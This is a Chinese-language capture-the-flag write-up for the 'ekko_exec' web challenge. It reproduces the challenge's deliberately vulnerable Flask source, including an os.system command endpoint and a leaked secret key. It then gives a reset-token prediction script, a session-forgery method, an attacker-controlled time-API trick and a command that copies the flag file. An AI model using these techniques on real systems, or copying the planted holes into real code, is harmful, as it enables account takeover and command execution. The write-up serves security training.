# web
## ekko_exec
题目源码如下
```python
# -*- encoding: utf-8 -*-

import os
import time
import uuid
import requests

from functools import wraps
from datetime import datetime
from secrets import token_urlsafe
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from flask import Flask, render_template, redirect, url_for, request, flash, session

  

SERVER_START_TIME = time.time()

  
  

# 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。

# 反正整个程序没有一个地方用到random库。应该没有什么问题。

import random

random.seed(SERVER_START_TIME)

  
  

admin_super_strong_password = token_urlsafe()

app = Flask(__name__)

app.config['SECRET_KEY'] = 'your-secret-key-here'

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'

app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

  

db = SQLAlchemy(app)

  

class User(db.Model):

    id = db.Column(db.Integer, primary_key=True)

    username = db.Column(db.String(20), unique=True, nullable=False)

    email = db.Column(db.String(120), unique=True, nullable=False)

    password = db.Column(db.String(60), nullable=False)

    is_admin = db.Column(db.Boolean, default=False)

    time_api = db.Column(db.String(200), default='https://api.uuni.cn//api/time')

  
  

class PasswordResetToken(db.Model):

    id = db.Column(db.Integer, primary_key=True)

    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)

    token = db.Column(db.String(36), unique=True, nullable=False)

    used = db.Column(db.Boolean, default=False)

  
  

def padding(input_string):

    byte_string = input_string.encode('utf-8')

    if len(byte_string) > 6: byte_string = byte_string[:6]

    padded_byte_string = byte_string.ljust(6, b'\x00')

    padded_int = int.from_bytes(padded_byte_string, byteorder='big')

    return padded_int

  

with app.app_context():

    db.create_all()

    if not User.query.filter_by(username='admin').first():

        admin = User(

            username='admin',

            email='admin@example.com',

            password=generate_password_hash(admin_super_strong_password),

            is_admin=True

        )

        db.session.add(admin)

        db.session.commit()

  

def login_required(f):

    @wraps(f)

    def decorated_function(*args, **kwargs):

        if 'user_id' not in session:

            flash('请登录', 'danger')

            return redirect(url_for('login'))

        return f(*args, **kwargs)

    return decorated_function

  

def admin_required(f):

    @wraps(f)

    def decorated_function(*args, **kwargs):

        if 'user_id' not in session:

            flash('请登录', 'danger')

            return redirect(url_for('login'))

        user = User.query.get(session['user_id'])

        if not user.is_admin:

            flash('你不是admin', 'danger')

            return redirect(url_for('home'))

        return f(*args, **kwargs)

    return decorated_function

  

def check_time_api():

    user = User.query.get(session['user_id'])

    try:

        response = requests.get(user.time_api)

        data = response.json()

        datetime_str = data.get('date')

        if datetime_str:

            print(datetime_str)

            current_time = datetime.fromisoformat(datetime_str)

            return current_time.year >= 2066

    except Exception as e:

        return None

    return None

@app.route('/')

def home():

    return render_template('home.html')

  

@app.route('/server_info')

@login_required

def server_info():

    return {

        'server_start_time': SERVER_START_TIME,

        'current_time': time.time()

    }

@app.route('/register', methods=['GET', 'POST'])

def register():

    if request.method == 'POST':

        username = request.form.get('username')

        email = request.form.get('email')

        password = request.form.get('password')

        confirm_password = request.form.get('confirm_password')

  

        if password != confirm_password:

            flash('密码错误', 'danger')

            return redirect(url_for('register'))

  

        existing_user = User.query.filter_by(username=username).first()

        if existing_user:

            flash('已经存在这个用户了', 'danger')

            return redirect(url_for('register'))

  

        existing_email = User.query.filter_by(email=email).first()

        if existing_email:

            flash('这个邮箱已经被注册了', 'danger')

            return redirect(url_for('register'))

  

        hashed_password = generate_password_hash(password)

        new_user = User(username=username, email=email, password=hashed_password)

        db.session.add(new_user)

        db.session.commit()

  

        flash('注册成功，请登录', 'success')

        return redirect(url_for('login'))

  

    return render_template('register.html')

  

@app.route('/login', methods=['GET', 'POST'])

def login():

    if request.method == 'POST':

        username = request.form.get('username')

        password = request.form.get('password')

  

        user = User.query.filter_by(username=username).first()

        if user and check_password_hash(user.password, password):

            session['user_id'] = user.id

            session['username'] = user.username

            session['is_admin'] = user.is_admin

            flash('登陆成功，欢迎!', 'success')

            return redirect(url_for('dashboard'))

        else:

            flash('用户名或密码错误!', 'danger')

            return redirect(url_for('login'))

  

    return render_template('login.html')

  

@app.route('/logout')

@login_required

def logout():

    session.clear()

    flash('成功登出', 'info')

    return redirect(url_for('home'))

  

@app.route('/dashboard')

@login_required

def dashboard():

    return render_template('dashboard.html')

  

@app.route('/forgot_password', methods=['GET', 'POST'])

def forgot_password():

    if request.method == 'POST':

        email = request.form.get('email')

        user = User.query.filter_by(email=email).first()

        if user:

            # 选哪个UUID版本好呢，好头疼 >_<

            # UUID v8吧，看起来版本比较新

            token = str(uuid.uuid8(a=padding(user.username))) # 可以自定义参数吗原来，那把username放进去吧

            reset_token = PasswordResetToken(user_id=user.id, token=token)

            db.session.add(reset_token)

            db.session.commit()

            # TODO：写一个SMTP服务把token发出去

            flash(f'密码恢复token已经发送，请检查你的邮箱', 'info')

            return redirect(url_for('reset_password'))

        else:

            flash('没有找到该邮箱对应的注册账户', 'danger')

            return redirect(url_for('forgot_password'))

  

    return render_template('forgot_password.html')

  

@app.route('/reset_password', methods=['GET', 'POST'])

def reset_password():

    if request.method == 'POST':

        token = request.form.get('token')

        new_password = request.form.get('new_password')

        confirm_password = request.form.get('confirm_password')

  

        if new_password != confirm_password:

            flash('密码不匹配', 'danger')

            return redirect(url_for('reset_password'))

  

        reset_token = PasswordResetToken.query.filter_by(token=token, used=False).first()

        if reset_token:

            user = User.query.get(reset_token.user_id)

            user.password = generate_password_hash(new_password)

            reset_token.used = True

            db.session.commit()

            flash('成功重置密码！请重新登录', 'success')

            return redirect(url_for('login'))

        else:

            flash('无效或过期的token', 'danger')

            return redirect(url_for('reset_password'))

  

    return render_template('reset_password.html')

  

@app.route('/execute_command', methods=['GET', 'POST'])

@login_required

def execute_command():

    result = check_time_api()

    if result is None:

        flash("API死了啦，都你害的啦。", "danger")

        return redirect(url_for('dashboard'))

  

    if not result:

        flash('2066年才完工哈，你可以穿越到2066年看看', 'danger')

        return redirect(url_for('dashboard'))

  

    if request.method == 'POST':

        command = request.form.get('command')

        os.system(command) # 什么？你说安全？不是，都说了还没完工催什么。

        return redirect(url_for('execute_command'))

  

    return render_template('execute_command.html')

  

@app.route('/admin/settings', methods=['GET', 'POST'])

@admin_required

def admin_settings():

    user = User.query.get(session['user_id'])

    if request.method == 'POST':

        new_api = request.form.get('time_api')

        user.time_api = new_api

        db.session.commit()

        flash('成功更新API！', 'success')

        return redirect(url_for('admin_settings'))

  

    return render_template('admin_settings.html', time_api=user.time_api)

  

if __name__ == '__main__':

    app.run(debug=False, host="0.0.0.0")
```
首先随便注册一个账户测试一下，发现不断通过/server_info返回时间戳
```python
@app.route('/server_info')
@login_required
def server_info():
    return {
        'server_start_time': SERVER_START_TIME,
        'current_time': time.time()
    }
```
通过源码审计发现是uuid8的随机数预测,随机数种子为server_start_time
```python
SERVER_START_TIME = time.time()

# 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。
# 反正整个程序没有一个地方用到random库。应该没有什么问题。

import random
random.seed(SERVER_START_TIME)
```
忘记密码的地方注释那么多，应该是在这里打
```python
@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        email = request.form.get('email')
        user = User.query.filter_by(email=email).first()
        if user:
            # 选哪个UUID版本好呢，好头疼 >_<
            # UUID v8吧，看起来版本比较新
            token = str(uuid.uuid8(a=padding(user.username))) # 可以自定义参数吗原来，那把username放进去吧
            reset_token = PasswordResetToken(user_id=user.id, token=token)
            db.session.add(reset_token)
            db.session.commit()
            # TODO：写一个SMTP服务把token发出去
            flash(f'密码恢复token已经发送，请检查你的邮箱', 'info')
            return redirect(url_for('reset_password'))
        else:
            flash('没有找到该邮箱对应的注册账户', 'danger')
            return redirect(url_for('forgot_password'))
```
找到源码中的padding函数并放进exp里，username换成admin
```python
import random
import uuid

random.seed(1755571108.2453325)

def padding(input_string):
    byte_string = input_string.encode('utf-8')
    if len(byte_string) > 6: byte_string = byte_string[:6]
    padded_byte_string = byte_string.ljust(6, b'\x00')
    padded_int = int.from_bytes(padded_byte_string, byteorder='big')
    return padded_int

token = str(uuid.uuid8(a=padding('admin')))
print(token)
```
通过/server_info内容找到随机数种子
![[Pasted image 20250819104323.png]]
由于uuid8在python3.14的最新版才能自定义参数，所以要使用python 3.14.0rc2运行，顺便记录一下python怎么开虚拟环境
```
pyenv install --list | grep "3.14" #用pyenv查看python3.14的所有可下载版本
pyenv install 3.14.0rc2 #下载3.14.0rc2（dev:开发阶段版本；alpha(a):预览版本；beat(b)修bug阶段版本；rc:待发布阶段）
python -m venv venv_rc2 #使用python的venv创建虚拟环境，可以使用特定的python解释器版本，也可以随意pip下载扩展包而避免和运行环境冲突（后面的venv_rc2是自定义环境名称）
source venv_rc2/bin/activate #激活虚拟环境
python --version 
Python 3.14.0rc2
```
运行后得出token可修改admin账号密码
![[Pasted image 20250819114429.png]]
将admin密码修改为123456后成功登录
![[Pasted image 20250819114716.png]]
这道题由于在源码中将flask session的key泄露了`app.config['SECRET_KEY'] = 'your-secret-key-here'`，因此也可以用session伪造来做
flask的session格式一般是由`base64加密`的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名组成的。一般分为数据，时间戳，签名组成，中间由.分开
将`sesion=eyJpc19hZG1pbiI6ZmFsc2UsInVzZXJfaWQiOjIsInVzZXJuYW1lIjoidGVzdDExMSJ9.aKPz6A.8hwgTxHGkCbttiiY58KQvnrv4nA`
base64解码得到数据部分为`{"is_admin":false,"user_id":2,"username":"test111"}`
将内容改成`{"is_admin":true,"user_id":1,"username":"admin"}`即可使用flask_session伪造脚本
![[Pasted image 20250819134724.png]]
得到新的session=eyJpc19hZG1pbiI6dHJ1ZSwidXNlcl9pZCI6MSwidXNlcm5hbWUiOiJhZG1pbiJ9.aKQPuA.6-iXeUICT2LEaYn6cuCKNmp-rao
也能登录admin
之后由于题目会通过调用时间api网站https://api.uuni.cn//api/time不断确认当前时间是否为2066，因此使用一个[免费自定义api网站](https://app.beeceptor.com/console/j0hnsm1th)设置一个api接口/lilctf2025/ekko_note.json只返回日期{"date":"2066-07-05T19:20:29"}再在admin设置里保存即可执行命令，但是由于结果无法回显，可以利用`mkdir -p static; cat /flag > static/flag.txt`外带flag访问/static/flag.txt即可获得flag
`LILCTF{u_H@V3_FoUnd_7He_r1GHt_7lM3LINE!}`
